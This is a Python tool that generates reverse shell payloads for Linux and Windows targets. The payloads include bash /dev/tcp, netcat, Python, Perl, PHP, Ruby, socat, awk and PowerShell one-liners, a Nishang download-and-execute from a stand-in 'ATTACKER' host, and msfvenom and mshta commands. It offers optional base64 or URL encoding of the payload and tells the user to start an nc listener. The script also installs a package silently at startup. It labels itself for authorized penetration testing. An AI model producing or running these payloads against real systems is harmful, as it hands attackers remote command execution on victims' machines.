#!/usr/bin/env python3
"""
Reverse Shell Payload Generator
by.Son1c
"""
import os
import sys
import base64
import urllib.parse

os.system("apt install figlet -y")
os.system("clear")
os.system("figlet ReverseShell-Gen")

LINUX_SHELLS = {
    "1": ("Bash -i", "url", lambda ip, port: f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
    "2": ("Bash (read line)", "url", lambda ip, port: (
        f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196"
    )),
    "3": ("Netcat -e", None, lambda ip, port: f"nc -e /bin/sh {ip} {port}"),
    "4": ("Netcat (no -e, mkfifo)", None, lambda ip, port: (
        f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    )),
    "5": ("Netcat -c", None, lambda ip, port: f"nc -c /bin/sh {ip} {port}"),
    "6": ("Python3", None, lambda ip, port: (
        "python3 -c 'import socket,os,pty;"
        f"s=socket.socket();s.connect((\"{ip}\",{port}));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        "pty.spawn(\"/bin/sh\")'"
    )),
    "7": ("Perl", None, lambda ip, port: (
        "perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,"
        "getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"/bin/sh -i\");};'" % (ip, port)
    )),
    "8": ("PHP", None, lambda ip, port: (
        "php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        % (ip, port)
    )),
    "9": ("Ruby", None, lambda ip, port: (
        "ruby -rsocket -e 'exit if fork;"
        f"c=TCPSocket.new(\"{ip}\",\"{port}\");"
        "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read};end'"
    )),
    "10": ("Socat", None, lambda ip, port: (
        f"socat TCP:{ip}:{port} EXEC:'/bin/sh -li',pty,stderr,setsid,sigint,sane"
    )),
    "11": ("Awk", None, lambda ip, port: (
        'awk \'BEGIN{s="/inet/tcp/0/%s/%s";while(1){getline q<s;'
        'if(q=="")break;print q|&"/bin/sh";"/bin/sh"|&getline p;print p|s;close("/bin/sh")}}\''
        % (ip, port)
    )),
}

WINDOWS_SHELLS = {
    "1": ("PowerShell #1 (TCP client)", "base64", lambda ip, port: (
        "$client = New-Object System.Net.Sockets.TCPClient('"
        f"{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + "
        "(pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
        "$client.Close()"
    )),
    "2": ("PowerShell Nishang (Invoke-PowerShellTcp)", "base64", lambda ip, port: (
        f"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-PowerShellTcp.ps1'); "
        f"Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
    )),
    "3": ("Netcat (nc.exe, must be on target)", None, lambda ip, port: (
        f"nc.exe -e cmd.exe {ip} {port}"
    )),
    "4": ("Python (if installed)", None, lambda ip, port: (
        "python -c \"import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "p=subprocess.call(['cmd.exe'])\""
    )),
    "5": ("Socat", None, lambda ip, port: (
        f"socat TCP:{ip}:{port} EXEC:'cmd.exe',pipes"
    )),
    "6": ("Metasploit (msfvenom exe/meterpreter)", None, lambda ip, port: (
        f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} "
        "-f exe -o shell.exe"
    )),
    "7": ("mshta (HTA staged)", None, lambda ip, port: (
        f"mshta http://{ip}:{port}/payload.hta"
    )),
}


def choose(title, options):
    print(f"\n{title}")
    for key in sorted(options, key=lambda k: int(k)):
        print(f"  [{key}] {options[key][0]}")
    while True:
        sel = input("Select: ").strip()
        if sel in options:
            return sel
        print("Invalid choice, try again.")


ENC_LABELS = {"url": "URL encode", "base64": "Base64"}


def choose_os():
    print("\nTarget OS")
    print("  [1] Linux")
    print("  [2] Windows")
    while True:
        sel = input("Select: ").strip()
        if sel in ("1", "2"):
            return "linux" if sel == "1" else "windows"
        print("Invalid choice, try again.")


def ask_yes_no(prompt):
    while True:
        sel = input(prompt).strip().lower()
        if sel in ("y", "yes"):
            return True
        if sel in ("n", "no"):
            return False
        print("Invalid choice, try again.")


def encode_payload(payload, enc):
    if enc == "url":
        return urllib.parse.quote(payload)
    return base64.b64encode(payload.encode("utf-16le")).decode()


def main():
    print("=== Reverse Shell Payload Generator ===")
    print("For authorized penetration testing / lab use only.")

    os_choice = choose_os()
    shells = LINUX_SHELLS if os_choice == "linux" else WINDOWS_SHELLS

    shell_key = choose("Reverse shell type", shells)
    name, enc_type, builder = shells[shell_key]

    ip = input("\nListener IP (your attack box): ").strip()
    port = input("Listener port: ").strip()

    if not ip or not port:
        print("IP and port are required.")
        sys.exit(1)

    payload = builder(ip, port)

    enc_label = "Raw"
    encoded = enc_type and ask_yes_no(f"\nEncode payload with {ENC_LABELS[enc_type]}? (y/n): ")
    if encoded:
        payload = encode_payload(payload, enc_type)
        enc_label = ENC_LABELS[enc_type]
        if enc_type == "base64":
            payload = f"powershell -EncodedCommand {payload}"
    elif enc_type == "base64":
        payload = f'powershell -nop -c "{payload}"'

    print("\n" + "=" * 60)
    print(f"OS:    {os_choice.capitalize()}")
    print(f"Type:  {name}")
    print(f"LHOST: {ip}  LPORT: {port}")
    print(f"Enc:   {enc_label}")
    print("-" * 60)
    print(payload)
    print("=" * 60)
    print(f"\nStart a listener first, e.g.:  nc -lvnp {port}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nAborted.")